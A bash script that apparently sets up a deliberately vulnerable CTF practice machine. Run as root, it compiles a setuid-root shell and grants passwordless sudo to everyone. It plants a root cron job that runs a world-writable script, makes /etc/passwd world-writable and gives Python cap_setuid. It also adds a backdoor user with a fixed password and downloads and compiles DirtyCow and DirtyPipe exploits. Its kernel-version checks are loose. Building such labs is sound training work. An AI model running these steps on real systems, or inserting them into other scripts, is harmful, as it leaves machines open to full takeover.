#!/bin/bash

# =============================================
# Auto-CTF Machine Configurator
# Features:
# 1. Checks kernel for DirtyPipe/DirtyCow
# 2. Implements 6 privilege escalation vectors
# 3. Color-coded output and safety checks
# =============================================

# Color setup
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

# Banner
echo -e "${YELLOW}"
cat << "EOF"

ooooooooooooo ooooo   ooooo   .oooooo.   ooooo        oooooo     oooo ooooo         
8'   888   `8 `888'   `888'  d8P'  `Y8b  `888'         `888.     .8'  `888'         
     888       888     888  888      888  888           `888.   .8'    888          
     888       888ooooo888  888      888  888            `888. .8'     888          
     888       888     888  888      888  888             `888.8'      888          
     888       888     888  `88b    d88'  888       o      `888'       888          
    o888o     o888o   o888o  `Y8bood8P'  o888ooooood8       `8'       o888o         
                                                                                    
                                                                                    
                                                                                    
ooooo         o8o              ooooooo  ooooo                    .o        .oooo.   
`888'         `"'               `8888    d8'                   o888       d8P'`Y8b  
 888         oooo  ooo. .oo.      Y888..8P         oooo    ooo  888      888    888 
 888         `888  `888P"Y88b      `8888'           `88.  .8'   888      888    888 
 888          888   888   888     .8PY888.           `88..8'    888      888    888 
 888       o  888   888   888    d8'  `888b           `888'     888  .o. `88b  d88' 
o888ooooood8 o888o o888o o888o o888o  o88888o          `8'     o888o Y8P  `Y8bd8P'  
                                                                                    
                                                                                    
                                                           
                                                                                    
                                                                                    
                                                                                    
                                                                                    
                                                                                    
                                                                                    
                                                                                    
                                                                                    
                                                                                    
                                                                                                                             
EOF
echo -e "${NC}"

# Root check
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Error: Run as root!${NC}"
    exit 1
fi

# Kernel check function
check_kernel_vulns() {
    kernel_version=$(uname -r | cut -d '.' -f 1-3)
    echo -e "${YELLOW}[*] Kernel Version: ${kernel_version}${NC}"

    # DirtyCow (CVE-2016-5195) - Kernel 2.x to 4.x
    if [[ "$kernel_version" =~ ^(2\.|3\.|4\.) ]]; then
        dirtycow=1
        echo -e "${GREEN}[+] Vulnerable to DirtyCow (CVE-2016-5195)${NC}"
    else
        dirtycow=0
    fi

    # DirtyPipe (CVE-2022-0847) - Kernel 5.8 to 5.16.11
    if [[ "$kernel_version" =~ ^5\.(8|9|10|11|12|13|14|15|16) ]] && \
       [[ "$(printf '%s\n' "5.16.11" "$kernel_version" | sort -V | head -n1)" != "5.16.11" ]]; then
        dirtypipe=1
        echo -e "${GREEN}[+] Vulnerable to DirtyPipe (CVE-2022-0847)${NC}"
    else
        dirtypipe=0
    fi

    if [[ $dirtycow -eq 0 && $dirtypipe -eq 0 ]]; then
        echo -e "${RED}[-] Kernel not vulnerable to DirtyPipe/DirtyCow${NC}"
        read -p "Continue with other escalation methods? (y/n) " choice
        case "$choice" in
            y|Y ) return 0;;
            * ) exit 0;;
        esac
    fi
    return 1
}

# Privilege escalation vectors
setup_privesc() {
    echo -e "\n${YELLOW}[*] Configuring Privilege Escalation Vectors${NC}"

    # 1. SUID Binary
    echo -e "${GREEN}[+] Creating SUID root binary at /usr/bin/suid-sh${NC}"
    cat << 'EOF' > /tmp/suid.c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
EOF
    gcc /tmp/suid.c -o /usr/bin/suid-sh
    chmod 4755 /usr/bin/suid-sh
    rm /tmp/suid.c

    # 2. Sudo Misconfiguration
    echo -e "${GREEN}[+] Adding ALL NOPASSWD to /etc/sudoers${NC}"
    echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers

    # 3. Cron Job
    echo -e "${GREEN}[+] Creating vulnerable cron job at /etc/cron.d/backdoor${NC}"
    echo "* * * * * root /opt/backdoor.sh" > /etc/cron.d/backdoor
    echo -e '#!/bin/sh\nchmod 4755 /bin/bash' > /opt/backdoor.sh
    chmod 777 /opt/backdoor.sh

    # 4. Writable /etc/passwd
    echo -e "${GREEN}[+] Making /etc/passwd world-writable${NC}"
    chmod 666 /etc/passwd

    # 5. Capabilities
    echo -e "${GREEN}[+] Adding cap_setuid to Python${NC}"
    setcap cap_setuid+ep $(which python3) 2>/dev/null || \
    setcap cap_setuid+ep $(which python) 2>/dev/null

    # 6. SSH Backdoor
    echo -e "${GREEN}[+] Creating backdoor user 'hacker:Password123!'${NC}"
    useradd -m -s /bin/bash hacker 2>/dev/null
    echo "hacker:Password123!" | chpasswd

    # 7. Kernel Exploits (if vulnerable)
    if [[ $dirtycow -eq 1 ]]; then
        echo -e "${GREEN}[+] Downloading DirtyCow exploit to /tmp/dirtycow${NC}"
        curl -sL https://github.com/dirtycow/dirtycow.github.io/raw/master/dirtyc0w.c -o /tmp/dirtycow.c
        gcc /tmp/dirtycow.c -o /tmp/dirtycow -lpthread
    fi

    if [[ $dirtypipe -eq 1 ]]; then
        echo -e "${GREEN}[+] Downloading DirtyPipe exploit to /tmp/dirtypipe${NC}"
        curl -sL https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/raw/main/exploit.c -o /tmp/dirtypipe.c
        gcc /tmp/dirtypipe.c -o /tmp/dirtypipe
    fi
}

# Main execution
check_kernel_vulns
setup_privesc

# Summary
echo -e "\n${YELLOW}[*] Privilege Escalation Summary:${NC}"
echo -e "1. ${GREEN}SUID Binary${NC}: /usr/bin/suid-sh"
echo -e "2. ${GREEN}Sudo Misconfig${NC}: ALL NOPASSWD in /etc/sudoers"
echo -e "3. ${GREEN}Cron Job${NC}: /etc/cron.d/backdoor → /opt/backdoor.sh"
echo -e "4. ${GREEN}Writable /etc/passwd${NC}"
echo -e "5. ${GREEN}Python Capabilities${NC}: cap_setuid"
echo -e "6. ${GREEN}SSH Backdoor${NC}: hacker:Password123!"
[[ $dirtycow -eq 1 ]] && echo -e "7. ${GREEN}DirtyCow Exploit${NC}: /tmp/dirtycow"
[[ $dirtypipe -eq 1 ]] && echo -e "8. ${GREEN}DirtyPipe Exploit${NC}: /tmp/dirtypipe"

echo -e "\n${GREEN}[+] CTF machine configured successfully!${NC}"
echo -e "Use these vectors for privilege escalation practice.\n"